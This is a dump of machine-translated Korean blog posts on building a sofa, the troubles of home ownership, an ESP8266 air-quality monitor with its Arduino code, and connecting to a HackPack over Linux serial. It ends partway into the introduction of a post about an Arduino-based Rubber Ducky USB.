걸렸지만, 모든 것이 맞는 것을 보는 것이 더욱 만족스러웠어요. 물론, 이 부분을 너무 복잡하게 공학화했지만, 부서질 수 있는 것보다 굉장히 견고한 기반을 가지는 편이 나을거예요.\n\n![이미지](/assets/img/2024-06-22-Soyouwanttomakeasofa_7.png)\n\n![이미지](/assets/img/2024-06-22-Soyouwanttomakeasofa_8.png)\n\n![이미지](/assets/img/2024-06-22-Soyouwanttomakeasofa_9.png)\n\n<div class=\"content-ad\"></div>\n\n소파의 나머지 부분에는 측면에서 나사를 숨기기 위해 포켓 스크류를 사용했어요. 포켓 스크류는 목졸과 삽목접합만큼 강력하다고 하는데, 제 의심이 좀 들긴 해요. 그래도 상당히 튼튼하고 소파의 나머지 부분에는 잘 작동해요.\n\n![이미지1](/assets/img/2024-06-22-Soyouwanttomakeasofa_10.png)\n\n![이미지2](/assets/img/2024-06-22-Soyouwanttomakeasofa_11.png)\n\n![이미지3](/assets/img/2024-06-22-Soyouwanttomakeasofa_12.png)\n\n<div class=\"content-ad\"></div>\n\n# 테이프스트리\n\n액자를 만들었으면 이제 위에 올릴 쿠션을 만들 차례입니다. 하지만 먼저 소파에 웹을 깔아야 합니다.\n\n![이미지](/assets/img/2024-06-22-Soyouwanttomakeasofa_13.png)\n\n![이미지](/assets/img/2024-06-22-Soyouwanttomakeasofa_14.png)\n\n<div class=\"content-ad\"></div>\n\n웹빙 작업은 한쪽을 스테이플러로 고정한 다음 웹빙 스트레처 도구를 사용해서 웹빙을 늘리는 것을 포함했어요. 저는 메탈 못이 있는 전통적인 웹빙 스트레처를 사용했어요. 불필요한 구멍을 더 내기 싫어서요. 웹빙의 힘 때문에 손으로 늘리기 힘들어요. 제대로 늘린 경우 드럼 소리가 납니다. 베이스에 9~10개의 스테이플을 조금 많이 넣었을 수도 있지만, 그만큼 튀어나오지는 않을 거예요. 뒷면에는 스트레스가 많이 가지 않을 테니 (스테이플을 그렇게 많이 사용하고 싶지 않아서) 적게 사용하고요. 각 스트랩을 다른 스트랩에 통과시켜 더 많은 지지력을 얻었어요.\n\n![이미지](/assets/img/2024-06-22-Soyouwanttomakeasofa_15.png)\n\n이제 웹빙이 설치된 상태이니 이제는 그 위에 올라가는 쿠션을 만들 차례에요. 좌석용과 등받이용으로 총 6개의 폼 쿠션을 주문했고, 밀봉된 채 압축되어 있어서 하루 정도 자율시간을 줬어요. 쿠션들이 자연스럽게 풀리는 동안, 마이크로파이버 천을 사용해 커버를 만들기 시작했어요. 좌석 커버의 치수는 24인치 W x 28인치 L x 6인치 H 이구요 (1/4인치의 솔잎 마진을 고려해 잘린 원단은 1/2인치 더 넓어요). 등받이 커버는 24인치 W x 16인치 H x 5인치 D이고 아래쪽에서 약간의 각도를 주어 6인치까지 향하게 했어요. 좌석 쿠션 폼은 커버를 채우기 위해 25인치 x 29인치 x 6.5인치로 재는 거에요. 하지만 여기서 실수를 했어요. 추가 폭을 고려하지 않았기 때문에 세 개를 나란히 두면 소파 가장자리 밖으로 2인치가 튀어나와요. 큰 문제는 아니지만 다른 쪽에 팔걸이를 놓을 수 없다는 걸 의미해요. 그래서 나 자신 (그리고 다른 분들)에게 이 점을 기억해 두면 좋겠어요: 좌석 커버를 채우기 위해 더 큰 쿠션을 사용하지만 사이즈를 맞춰 길이에 맞게 해야 해요.\n\n또 다른 부가 설명으로, 커버를 1/2인치로 작게 만들면 폼이 커버 안에서 올록볼록해질 수 있기 때문에 측정은 정확히 해야 해요.\n\n<div class=\"content-ad\"></div>\n\n\n![Image](/assets/img/2024-06-22-Soyouwanttomakeasofa_16.png)\n\n실제로 발포체를 커버에 맞게 넣으려면 밀봉 된 비닐봉지에 넣고 진공을 붙인 후 압축을 시작해야 합니다. 쿠션에 넣을 발포체는 조금 단단했기 때문에 압축하지 않고 그냥 집어넣으려고 한다면 거의 불가능할 것입니다. 압축된 상태로 커버에 빨리 넣어 버리고 다른 것에 사용할 비닐봉지를 조금씩 빼내 주었습니다.\n\n커버를 위해, 각 측면을 측정하고 1/2\"씩 더해 솔실을 만들었습니다. 거대한 10야드 마이크로파이버 롤에서 각 조각을 잘라냈습니다. 운이 좋게도, 아주 약간만 남겨 모든 쿠션을 만들기에 충분했습니다.\n\n![Image](/assets/img/2024-06-22-Soyouwanttomakeasofa_17.png)\n\n\n<div class=\"content-ad\"></div>\n\n\n![image](/assets/img/2024-06-22-Soyouwanttomakeasofa_18.png)\n\n# 마무리\n\n마지막 단계는 목재에 염색을 하고 밀봉하여 깨끗한 모습을 만들어 줍니다. 사용 중인 제품은 한 번의 염색으로 충분하다고 해서 염색이 마르고 난 후에 밀봉을 하였습니다. 사진은 없어서 죄송해요. 카메라를 얼룩지지 않게 하기 위해 찍지 않았답니다. 염색하는 것은 일반 페인트로 그림 그리는 것과 비슷해요. 단지, 흡수된 후 닦아야 합니다. 캔에 적힌 지침을 따르면 됩니다.\n\n그리고 소파에 맞는 세 개의 16인치 액센트 베개를 만들었어요. 벽과 일치하도록 연한 파란색에서 짙은 파란색까지 시작했어요. 쿠션을 만드는 데 많은 시간을 들인 후, 베개를 만드는 것은 정말 쉬웠어요.\n\n\n<div class=\"content-ad\"></div>\n\n\n<img src=\"/assets/img/2024-06-22-Soyouwanttomakeasofa_19.png\" />\n\n<img src=\"/assets/img/2024-06-22-Soyouwanttomakeasofa_20.png\" />\n\n그래서 거기에요, 소파를 만드는 방법에 대한 간략한 개요예요. 주말에 2달 동안 이에 작업한 뒤로, 좋은 소파가 2,000달러 정도 하는 이유가 보여요. 이것에는 많은 노력이 필요하고, 모든 것을 건설하기 위해 많은 특수 도구가 필요해요. 시간을 들이고 처음 소파를 만들 때 몇 가지 실수를 해도 괜찮다면 시도해볼 만 해요. 예상보다 시간이 더 오래 걸리고, 모든 것을 처음부터 사면 일반적인 소파만큼 비용이 들어요. 소파 이외의 더 만들 계획을 가지고 있거나 이미 도구가 있는 경우에는 재미있는 시도가 될 수도 있어요.\n\n다음에는 어디로 갈지요? 아마도 새로운 소파와 어울리는 커피 테이블을 만들 거예요. 이제 도구가 있으니까, 모든 것을 꾸밀 수 있을 것 같아요. 또한, 모든 것을 로그한 상태이기 때문에 이 소파에 대한 더 자세한 계획을 작성할 수도 있지만, 지금은 간단한 개요가 좋아요.\n","ogImage":{"url":"/assets/img/2024-06-22-Soyouwanttomakeasofa_0.png"},"coverImage":"/assets/img/2024-06-22-Soyouwanttomakeasofa_0.png","tag":["Tech"],"readingTime":10},{"title":"집은 단순한 주거지가 아닌, 낡은 카펫과 새는 정화조까지 내 집의 현주소","description":"","date":"2024-06-22 18:57","slug":"2024-06-22-AHouseIsMoreThanaHomeItsPee-StainedCarpetsandaLeakySepticTank","content":"\n\n## BOB'S VILLA\n\n![House](/assets/img/2024-06-22-AHouseIsMoreThanaHomeItsPee-StainedCarpetsandaLeakySepticTank_0.png)\n\n집을 사셨다고 들었어요. 축하해요! 하드웨어 가게에서 언제 돌아올 건가요?\n\n모두가 임대가 싫다는 걸 알아. 하지만 간단함을 그리워할 거야 - 하수관이 막히면 집주인에게 전화하면 되고, 걔는 무시해. 거래 끝. 이제 스스로 무시해야 해. 예상보다 높은 스트레스 일 수 있어.\n\n<div class=\"content-ad\"></div>\n\n즐거운 일은 실제로 떨어지기 시작할 때부터 시작됩니다.\n\n부동산 중개인이 모든 것을 말해 주지 않았네요. 켈리는 미소를 지은 채 \"i\"에 하트를 찍는 것에만 관심이 있었을 뿐, 집 수리의 어두운 면을 드러내지 않았어요. 스스로 해결하거나 나사를 조이는데 100달러를 요구하는 사람에게 수표를 쓰는 것 말이에요.\n\n저와 결혼한 여자가 시작한 수리 여정은 우리가 이사 온 날부터 시작되었어요. 이전 주인은 환각증 환자를 위한 구조 켄넬을 운영한 것 같더라구요.\n\n새 집에서 웃고 깨끗한 카펫 밑에서 걸어가는 커플이 나오는 광고를 보신 적이 있을 겁니다. 우리 집은 미소와 함께진머리때랑 버려지 곳에서 무래를 내다고 했어요.\n\n<div class=\"content-ad\"></div>\n\n새로운 주택 소유주가 되는 것은 로맨틱한 저녁 식사와 열정적인 밤으로 축하해야 합니다. \"전화 좀 받아줄래? 난 너무 피곤해서 전화를 못 받겠어,\" 라는 대답과 그녀가 나에게 10피트 이내로 다가올 때까지 세 번의 샤워가 있었습니다.\n\n이것은 단지 시작에 불과했습니다.\n\n켈리는 우리 집이 \"오래된 집\"이라고 말했습니다. 이는 사무엘 L. 잭슨이 \"지갑을 태워버릴 것이 뭐라고?\" 라고 물었을 때 사용하는 기분 좋은 부동산 용어입니다.\n\n집 주변에 재능이 있는 편이지만, 이는 좋은 소식과 나쁜 소식이 함께하는 상황입니다. 항상 이런 역할을 원하진 않았지만, 모기지 생활의 또 다른 즐거움은 재정상태가 폭탄 구멍처럼 되어있다는 것입니다.\n\n\n<div class=\"content-ad\"></div>\n\n그래서 나는 리모델링 시지푸스가 되었다. 홈 디포를 끝없이 돌아다니며 카트를 밀어야만 하는 운명에 처했고, 항상 이번이 마지막 여행일 것이라 믿기를 계속했다.\n\n우리는 여기서 20년을 살았다. 오늘 일찍 거기에 있었다. 마지막 여행은 없다. \n\n하지만 DIY에도 한계가 있어야 한다. 몇 년 전부터 우리 지붕의 낙엽을 불어내는 일을 하는 회사에 돈을 주기 시작했다. 나태함이 아니라, 나는 이미 60살이고 토요일 아침에는 대학교생처럼 균형을 잡을 수 없다.\n\n20살 때는 땅에 닿으면 튕겼다. 지금은 잘못 자는 것만으로도 난전기를 당할 수 있다. 누군가에게 그 위험을 무릎치고 감내할 수 있다면 날 기쁘게 생각한다.\n\n<div class=\"content-ad\"></div>\n\n제 생각에는 손대지 말아야 할 것들이 있다는 걸 받아 들였어 — 너희를 봐, 오수조. 지난 가을, 잔디에 부드러운 곳이 생겨서 가스 루프를 내더라고.\n\n이크. 핸드폰 좀 줄래?\n\n만약 변기 탱크를 파내서 무엇이 잘못됐는지 알아보려고 한다면, 해 봐. 그런데 잔디가 방귀를 뀌면 나는 전문가를 불러야지.\n\n\"John Werth\"는 실재하는 사람이 아니라, 몇 마리의 원숭이가 무작위로 타이핑해서 몇 개의 일관된 문장을 이어붙이기 위해 노력한 결과란다. 읽어보고 구독해 주세요, 과일가게에 우리의 신용이 바닥 나가고 있는데 바나나가 필요해. 원숭이들에게 감사를 전해요!\n\n<div class=\"content-ad\"></div>\n\n또한, 글쓰기는 힘든 일이에요. 커피 한 잔 사주시면 조금은 힘내게 될 거 같아요.\n* 참고: 기부금은 사전 통지 없이 법적 지원 기금으로 재할당될 수도 있어요.\n\n더 많은 유머 시도를 찾고 있다면 여기를 확인해보세요:\n\n아니면 제가 매우 좋아하는 논픽션 개 이야기를 보시겠어요:\n\nMuddyUm의 뉴스레터 'The Real Dirt'를 구독하려면 여기를 클릭해주세요.\n\n<div class=\"content-ad\"></div>\n\n\n![House](/assets/img/2024-06-22-AHouseIsMoreThanaHomeItsPee-StainedCarpetsandaLeakySepticTank_1.png)\n","ogImage":{"url":"/assets/img/2024-06-22-AHouseIsMoreThanaHomeItsPee-StainedCarpetsandaLeakySepticTank_0.png"},"coverImage":"/assets/img/2024-06-22-AHouseIsMoreThanaHomeItsPee-StainedCarpetsandaLeakySepticTank_0.png","tag":["Tech"],"readingTime":3},{"title":"ESP8266로 만드는 나만의 공기질 모니터링 시스템 만들기","description":"","date":"2024-06-22 18:55","slug":"2024-06-22-CreatingYourOwnAirQualityMonitoringSystemwithESP8266","content":"\n\n<img src=\"/assets/img/2024-06-22-CreatingYourOwnAirQualityMonitoringSystemwithESP8266_0.png\" />\n\n깨끗하고 신선한 공기는 건강한 생활 환경의 기본 요소입니다. 그런데 실제로 우리가 무엇을 호흡하고 있는지 얼마나 자주 알고 있을까요? 주변의 공기 품질을 모니터링하고 실시간으로 온도, 습도 등의 업데이트를 받을 수 있다면 어떨까요?\n\n사물인터넷(IoT) 시대에 우리는 주변 환경을 더 잘 이해하기 위한 기술을 손에 넣었습니다. 다재다능하고 가격이 적당한 ESP8266 마이크로컨트롤러는 지능적인 공기 센서 시스템을 구축하는 열쇠입니다.\n\n방 안의 공기 품질에 대한 데이터를 수집하는 장치뿐만 아니라 슬릭한 LCD 디스플레이와 편리한 웹 기반 대시보드에서 그 정보를 공유하는 장치가 있다고 상상해보세요. 당신은 환경에 대해 인식할 뿐만 아니라 건강에 대한 판단도 내릴 권리를 갖게 될 것입니다.\n\n<div class=\"content-ad\"></div>\n\n이 글에서는 여러분께 자신만의 대기질 모니터링 시스템을 만드는 여정에 참여해 보시도록 하겠습니다. 하드웨어 설정, ESP8266 마이크로컨트롤러 프로그래밍, 그리고 수집된 데이터에 액세스하기 위한 RESTful API 개발에 대해 알아보겠습니다. 기술에 능통하신 분이든, IoT 여정을 막 시작한 분이든, 이 프로젝트는 여러분이 지금껏 경험하지 못한 방식으로 주거 공간을 관찰하고 분석할 수 있도록 돕기 위해 설계되었습니다.\n\n대기질을 제어하고 DIY IoT 장치의 세계로 나아가는 준비가 되셨나요? 함께 시작해 신뢰성 있고 유익하며 비용 효율적인 대기질 모니터링 시스템을 만들어보세요.\n\n# 프로젝트 개요\n\n이 프로젝트의 목표는 대기질 데이터를 수집하고 분석하는 IoT 장치를 만드는 것입니다. 구체적으로 환경에서 온도, 습도 및 가끔은 대기질 매개변수를 추적하고 이 데이터를 Thingspeak 같은 플랫폼이나 화면에 전송하는 것을 추구합니다. 또한 간단한 웹 서버를 설정하여 REST API를 통해 센서 데이터를 제공하는 방법에 대해서도 알아볼 것입니다.\n\n<div class=\"content-ad\"></div>\n\n# 하드웨어 요구 사항\n\n![하드웨어 요구 사항](/assets/img/2024-06-22-CreatingYourOwnAirQualityMonitoringSystemwithESP8266_1.png)\n\n위 사진에 있는 모든 기기가 필요하지는 않아요😀.\n다음 부품이 필요해요:\n\n- NodeMCU ESP8266 보드\n- 4.7k 옴 저항\n- DHT11 센서\n- MQ135 센서\n- 16x2 LCD 디스플레이\n- I2C LCD 인터페이스 어댑터\n- 와이어\n- 브레드보드\n\n<div class=\"content-ad\"></div>\n\n## ESP8266의 힘\n\n이 프로젝트의 핵심은 ESP8266 마이크로컨트롤러에 있습니다. 이 작고 강력한 장치는 내장 Wi-Fi 기능을 갖춘 IoT(Internet of Things) 프로젝트에 이상적인 후보입니다. 이 장치는 우리에게 대기 질 데이터를 수집하고 전송하는 일을 쉽게 해줍니다.\n\n## 센서의 역할\n\n이 프로젝트에서는 두 가지 주요 센서인 DHT-11과 MQ-135 센서가 사용됩니다.\n\n<div class=\"content-ad\"></div>\n\n- DHT-11 센서: 이 센서는 온도 및 습도 데이터를 제공하여 환경의 편안함 수준을 더 포괄적으로 파악하는 데 도움을 줍니다.\n- MQ-135 센서: MQ-135 센서는 공기 품질에 집중합니다. 암모니아, 이산화탄소, 메탄을 포함한 다양한 가스를 감지할 수 있어 실내 공기 품질을 측정하는 데 탁월한 선택지입니다.\n\n## LCD 디스플레이\n\n이 프로젝트에서 사용된 LCD 디스플레이는 I2C(Inter-Integrated Circuit) 인터페이스가 장착된 Arduino 호환 디스플레이입니다. I2C는 다양한 구성 요소의 연결을 단순화하는 통신 프로토콜로, ESP8266와 같은 마이크로컨트롤러와의 통합에 이상적입니다. 원활한 호환성과 기능을 보장하기 위해 I2C 인터페이스 어댑터도 사용합니다. 나중에 소스 코드 조각을 작성하여 이 16x2 (16 문자 및 2 줄) 디스플레이를 사용하여 온도, 습도 및 공기 입자 정보를 표시합니다.\n\n# 배선 및 연결\n\n<div class=\"content-ad\"></div>\n\n프로젝트의 하드웨어 요구 사항은 최소한이며, 따라서 배선은 간단합니다. 회로도에 표시된 대로 부품을 브레드보드에 쉽게 설정할 수 있습니다. 전문적인 전자 기술 지식이 필요하지 않는 초보자 친화적인 프로젝트입니다.\n\n센서를 마이크로컨트롤러에 연결하는 것부터 시작해 봅시다.\n\n마지막 단계는 LCD 디스플레이를 마이크로컨트롤러에 연결하는 것입니다. 더 자세한 배선 테이블과 다이어그램은 Github 저장소에서 확인할 수 있습니다.\n\n![이미지](/assets/img/2024-06-22-CreatingYourOwnAirQualityMonitoringSystemwithESP8266_2.png)\n\n<div class=\"content-ad\"></div>\n\n# 소프트웨어 작성하기\n\n다음 섹션에서는 저희의 공기 센서 프로젝트 소스 코드를 찾을 수 있습니다. 아두이노 스튜디오를 사용하여 프로그래밍 및 코드를 마이크로컨트롤러에 업로드 하는 데 익숙하다고 가정합니다. 이 C++ 코드는 제 GitHub 저장소에 있으며, https://github.com/manuelkienlein/ESP8266-AirSensor에서 접근할 수 있습니다. 자유롭게 탐색하고 수정하며, ESP8266에 코드를 업로드하여 자신만의 공기 품질 모니터링 시스템을 설정할 수 있습니다. 이제 코드 구현을 살펴보겠습니다:\n\n```js\n#include <ESP8266WiFi.h>\n#include <ESP8266WebServer.h>\n#include <LiquidCrystal_I2C.h>\n#include <DHT.h>\n#include \"MQ135.h\"\n\n// Thingspeak 및 WiFi\nString apiKey = \"apiKey\";\nconst char* wifi_ssid = \"WIFI-SSID\";\nconst char* wifi_password = \"WIFI-Password\";\n\n// 변수와 상수\n#define PIN_DHT 3 // DHT11 핀\n#define PIN_MQ 0 // MQ-135 핀\n#define LCD_COLUMNS 16\n#define LCD_ROWS 2\nconst char* server = \"api.thingspeak.com\";\n#define INTERVAL_THINGSPEAK 20 // Thingspeak 지연\n\n// 초기화\nDHT dht(PIN_DHT, DHT11);\nMQ135 gasSensor = MQ135(PIN_MQ);\nLiquidCrystal_I2C lcd(0x27, LCD_COLUMNS, LCD_ROWS);\n\nWiFiClient client;\nESP8266WebServer webserver(80);\n\nfloat humidity;\nfloat temperature;\nfloat rzero;\nfloat ppm;\nunsigned long previousMillis;\nunsigned long currentMillis;\n\nvoid setup() {\n  Serial.begin(115200);\n  Serial.println(\"시작...\");\n\n  lcd.begin(LCD_COLUMNS, LCD_ROWS);\n  lcd.init();\n  lcd.backlight();\n  lcd.setCursor(0, 0);\n  lcd.print(\"시작...\");\n\n  dht.begin();\n\n  lcd.setCursor(0, 1);\n  lcd.print(\"WiFi 연결\");\n  setupWiFi();\n  lcd.clear();\n  lcd.print(\"IP 주소:\");\n  lcd.setCursor(0, 1);\n  lcd.print(WiFi.localIP());\n  delay(10000);\n\n  webserver.on(\"/\", handleWebserverRequest_index);\n  webserver.on(\"/dht11\", handleWebserverRequest_dht11);\n  webserver.on(\"/mq135\", handleWebserverRequest_mq135);\n  webserver.begin();\n\n  int warmup = 30;\n  lcd.clear();\n  lcd.print(\" IoT 공기센서 \");\n  for(int i = warmup; i > 0; i--){\n    lcd.setCursor(0, 1);\n    lcd.print(\"열기중: \"+String(i)+\"초 \");\n    delay(1000);\n  }\n\n  lcd.clear();\n  delay(1000);\n}\n\nvoid loop() {\n  // 센서 값 갱신\n  humidity = dht.readHumidity();\n  temperature = dht.readTemperature();\n  rzero = gasSensor.getRZero();\n  ppm = gasSensor.getPPM();\n\n  // 현재 사용하지 않음\n  float rzero_corrected = gasSensor.getCorrectedRZero(temperature, humidity);\n  float ppm_corrected = gasSensor.getCorrectedPPM(temperature, humidity);\n  float resistance = gasSensor.getResistance();\n  float resistance_corrected = gasSensor.getCorrectedResistance(temperature, humidity);\n  int sensorValue = analogRead(PIN_MQ);\n\n  if (isnan(humidity) || isnan(temperature)) {\n    Serial.println(\"DHT 센서 데이터를 읽는 데 실패했습니다!\");\n    return;\n  }\n\n  // Thingspeak 업데이트 사이에 최소 15초 지연이 필요하기 때문에 20초 대기\n  currentMillis = millis();\n  if(currentMillis - previousMillis >= INTERVAL_THINGSPEAK*1000){\n    previousMillis = currentMillis;\n    sendToThingspeak();\n  }\n\n  // 웹서버 요청 처리\n  webserver.handleClient();\n\n  // 디스플레이 업데이트\n  updateDisplay();\n\n  //Serial.println(\"온도:\"+String(t)+\" \"+\"습도:\"+String(h));\n  Serial.println(\"온도:\"+String(temperature)+\" \"+\"습도:\"+String(humidity)+\" \"+\"rZero:\"+String(rzero)+\" \"+\"rZeroC:\"+String(rzero_corrected)+\" \"+\"PPM:\"+String(ppm)+\" \"+\"PPMC:\"+String(ppm_corrected));\n  //Serial.println(\"온도:\"+String(temperature)+\" \"+\"습도:\"+String(humidity)+\" \"+\"rZero:\"+String(rzero)+\" \"+\"rZeroC:\"+String(rzero_corrected)+\" \"+\"PPM:\"+String(ppm)+\" \"+\"PPMC:\"+String(ppm_corrected)+\" \"+\"저항:\"+String(resistance)+\" \"+\"저항C:\"+String(resistance_corrected));\n\n  delay(1000);\n}\n\nvoid setupWiFi(){\n  WiFi.begin(wifi_ssid, wifi_password);\n\n  Serial.println();\n  Serial.println();\n  Serial.print(\"연결 중: \");\n  Serial.println(wifi_ssid);\n\n  WiFi.begin(wifi_ssid, wifi_password);\n\n  while (WiFi.status() != WL_CONNECTED) {\n    delay(500);\n    Serial.print(\".\");\n  }\n  Serial.println(\"\");\n  Serial.println(\"WiFi 연결됨\");\n\n  Serial.print(\"IP 주소: \");\n  Serial.println(WiFi.localIP());\n}\n\nvoid sendToThingspeak(){\n  if (client.connect(server,80)) { // \"184.106.153.149\" 또는 \"api.thingspeak.com\"\n    String postStr = apiKey;\n    postStr +=\"&field1=\";\n    postStr += String(temperature);\n    postStr +=\"&field2=\";\n    postStr += String(humidity);\n    postStr +=\"&field3=\";\n    postStr += String(ppm);\n    postStr +=\"&field4=\";\n    postStr += String(rzero);\n    postStr += \"\\r\\n\\r\\n\";\n\n    client.print(\"POST /update HTTP/1.1\\n\");\n    client.print(\"Host: \"+String(server)+\"\\n\");\n    client.print(\"Connection: close\\n\");\n    client.print(\"X-THINGSPEAKAPIKEY: \"+apiKey+\"\\n\");\n    client.print(\"Content-Type: application/x-www-form-urlencoded\\n\");\n    client.print(\"Content-Length: \");\n    client.print(postStr.length());\n    client.print(\"\\n\\n\");\n    client.print(postStr);\n  }\n  client.stop();\n}\n\nvoid handleWebserverRequest_index(){\n  String message = \"{\\\"temperature\\\":\"+String(temperature)+\", \\\"humidity\\\":\"+String(humidity)+\", \\\"ppm\\\":\"+String(ppm)+\", \\\"rzero\\\":\"+String(rzero)+\"}\";\n  webserver.send(200, \"application/json\", message);\n}\n\nvoid handleWebserverRequest_dht11(){\n  String message = \"{\\\"temperature\\\":\"+String(temperature)+\", \\\"humidity\\\":\"+String(humidity)+\"}\";\n  webserver.send(200, \"application/json\", message);\n}\n\nvoid handleWebserverRequest_mq135(){\n  String message = \"{\\\"ppm\\\":\"+String(ppm)+\", \\\"rzero\\\":\"+String(rzero)+\"}\";\n  webserver.send(200, \"application/json\", message);\n}\n\nvoid updateDisplay(){\n  // 첫 번째 줄 출력\n  lcd.setCursor(0, 0);\n  lcd.print(\"T: \"+String(int(temperature))+(char)223+\"C | H: \"+String(int(humidity))+\"%\");\n\n  // 두 번째 줄 출력\n  lcd.setCursor(0, 1);\n  lcd.print(\"PPM: \"+String(int(ppm)));\n}\n```\n\n위의 소스 코드를 통해 대략적으로 우리가 무엇을 하려고 하는지 알 수 있을 것입니다. 그러나 간단히 시작해보겠습니다. 이제 한 단계씩 모든 것을 설명하겠습니다.\n\n<div class=\"content-ad\"></div>\n\nThingspeak\n\n우리는 무료 IoT 데이터 플랫폼인 thingspeak.com을 사용하고 있어요. 먼저 계정을 만들어야 해요. 그런 다음에 새로운 API 토큰을 생성하고 그 토큰을 \"apiKey\" 변수에 입력해야 해요. 그 작업을 완료하면 센서 데이터를 위한 개별 대시보드를 만들 수 있어요.\n\n![이미지](/assets/img/2024-06-22-CreatingYourOwnAirQualityMonitoringSystemwithESP8266_3.png)\n\nWi-Fi\n\n<div class=\"content-ad\"></div>\n\n인터넷을 통해 데이터를 송수신하려면 Wi-Fi 네트워크 이름과 암호를 입력해야 합니다:\n\n```js\nconst char* wifi_ssid = \"WIFI-SSID\";\nconst char* wifi_password = \"WIFI-Password\";\n```\n\nConnections & Pins\n\n일반적으로 esp 보드를 센서와 디스플레이에 연결할 때 동일한 하드웨어와 동일한 포트를 사용했다면 코드에서 포트 구성을 조정할 필요가 없습니다. 제 I2C 디스플레이 주소는 0x27입니다. 그러나 표시기의 주소가 제 것과 다를 수도 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nLiquidCrystal_I2C lcd(0x27, LCD_COLUMNS, LCD_ROWS);\n```\n\n해당 소스 코드를 이 저장소에서 찾을 수 있습니다:\n\n# 센서의 테스트와 보정\n\n첫 번째 단계는 센서를 보정하는 것입니다. 이를 위해서 센서를 회로에 연결하고 보정 프로세스를 완료하려면 센서를 24시간동안 전원에 연결한 채로 두어야 합니다. 이후 약 1시간 동안 20°C 정도의 외부 공기에 노출시켜 상대 습도가 35% 정도 되도록 합니다. 이 작업이 완료되면 보정 값이 잘 설정될 것입니다.\n\n<div class=\"content-ad\"></div>\n\n이 보정값을 얻으려면 다음 코드를 사용하십시오: rzero = gasSensor.getRZero();. 다음으로 중요한 단계는 보정 중에 결정한 값으로 기본 RZero 상수를 교체하는 것입니다. 이 값을 MQ135 센서 라이브러리의 파일 MQ135.h에서 찾고 #define RZERO 뒤에 특정 RZero 값을 넣어 교체하십시오. 각 센서마다 고유한 RZero 값이 있음을 기억하는 것이 중요합니다.\n\n여기서 반드시 말씀드리고 싶은 것은, 특히 MQ-135 센서가 매우 정확하지 않다는 것입니다. 그러나 이러한 단계를 따르면 센서 읽기의 최상의 정확도를 보장할 수 있습니다.\n\n## HTTP API\n\n이는 JSON 형식으로 센서 데이터를 제공하는 웹 서버를 포함합니다.\n이 장치를 연결하면, 열화 후 IP 주소가 표시됩니다. 이 IP 주소를 즐겨 사용하는 브라우저에 넣으면 JSON 형식의 HTTP-API를 통해 센서 데이터를 수집할 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n```js\nGET http://<IP-Address>/\n\n{\n  \"temperature\": 23.6,\n  \"humidity\": 31,\n  \"ppm\": 443.96,\n  \"rzero\": 979.75\n}\n```\n\n# 사용자 정의 기회\n\n프로젝트의 유연성을 통해 추가적인 향상이 가능합니다. 예를 들어 공기 품질이 미리 정의된 임계 값 이하로 떨어질 때 경고 메시지를 보내는 알림 시스템을 설정할 수 있습니다. 집 안의 공기 질이 나빠질 경우 폰으로 알림을 받는 상상을 해보세요.\n\n이 프로젝트를 통해 주변 공기의 품질을 파악할뿐만 아니라 맞춤화 및 개선 가능성에 대한 무한한 가능성을 열 수 있습니다. 전자 취미로 활동하시는 분이든, 단순히 더 깨끗한 공기를 들이쉬고 싶은 분이든, 직접 Arduino 공기 센서를 제작하는 것은 재미있고 보람차며 깨달음을 얻을 수 있는 여정입니다.\n\n<div class=\"content-ad\"></div>\n\nDIY 아두이노 프로젝트에 대해 어떻게 생각하세요? 다른 멋진 프로젝트를 이미 만들어 보셨나요?\n\n의견을 댓글로 남겨 주시고, 이 글이 마음에 드셨다면 아래에 있는 ♥ 버튼을 클릭하여 세계에 전파해주세요.","ogImage":{"url":"/assets/img/2024-06-22-CreatingYourOwnAirQualityMonitoringSystemwithESP8266_0.png"},"coverImage":"/assets/img/2024-06-22-CreatingYourOwnAirQualityMonitoringSystemwithESP8266_0.png","tag":["Tech"],"readingTime":10},{"title":"리눅스에서 HackPack 연결하는 방법","description":"","date":"2024-06-22 18:54","slug":"2024-06-22-ConnectingtoHackPackviaLinux","content":"\n\n해프팩은 이번 주에 출시된 크런치랩스의 정말 멋진 엔지니어링 상자에요. 조금 놀다가 흥미로운 것을 발견하면 글을 올릴 거예요.\n\n지금까지의 여정을 공유하고 싶었어요. 저는 아직 조금만 놀아봤는데 IR 터렛을 예비 라즈베리 파이에 연결했어요. 아마존에서 USB-A to USB-C 케이블을 사용했지만 데이터를 전송하는 케이블이면 되요. 정말 쉬웠어요.\n\n- 장치를 연결하고 해제하여 상자가 어떤 tty****에 연결되어 있는지 알아보세요. 저는 /dev/ttyUSB0에 연결됐어요.\n- 다음 명령을 사용하여 터미널 라인 설정을 합니다 (필요하면 장치를 바꿔주세요): stty -F /dev/ttyUSB0 raw 9600\n- 명령을 실행하세요: cat /dev/ttyUSB0 (또는 다른 장치)\n\n저는 그 후에 버튼 누름에 대한 디버그 데이터를 출력하기 시작했어요.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-22-ConnectingtoHackPackviaLinux_0.png\" />\n\n어쨌든, 오늘 즐거웠어요!\n\n출처:\n\n- https://arduino.stackexchange.com/questions/79058/access-serial-monitor-on-linux-cli-using-arduino-cli","ogImage":{"url":"/assets/img/2024-06-22-ConnectingtoHackPackviaLinux_0.png"},"coverImage":"/assets/img/2024-06-22-ConnectingtoHackPackviaLinux_0.png","tag":["Tech"],"readingTime":1},{"title":"아두이노로 컴퓨터 해킹하는 방법","description":"","date":"2024-06-22 18:52","slug":"2024-06-22-HackingacomputerusingArduino","content":"\n\n상상해보세요...\n\n이미지를 보셨죠! 이 글에서 나는 어떤 사람이 화장실에 간 동안 무단 침입한 미해금 컴퓨터에 잠입하는 방법을 설명할 겁니다. [주의: 컴퓨터 해킹 전 해당 사람으로부터 허가를 받았으며, 해킹이 완료된 후 컴퓨터를 원래 상태로 복원했습니다] 다만, 그 정도 시간 안에 할 수 있는 일에는 한계가 있었죠. 해킹 과정을 가속화하기 위해 나는 아두이노를 사용해 나만의 Rubber Ducky USB를 만들었습니다.\n\n# 아두이노 소개\n\n아두이노는 C 프로그래밍 언어를 사용하여 하드웨어 장치를 제어할 수 있게 해주는 마이크로 컨트롤러 및 마이크로 컨트롤러 키트입니다. 아두이노에는 각각 고유한 특성을 가진 여러 종류가 있습니다. 예를 들어, 아두이노 우노는 가격이 저렵하고 기본 기능 세트를 갖춰 가장 인기 있는 아두이노 보드로 간주됩니다.\n\n<div class=\"content-ad\"></div>\n\n이 글은 ATmega32u4를 기반으로 한 마이크로 컨트롤러 보드인 Arduino 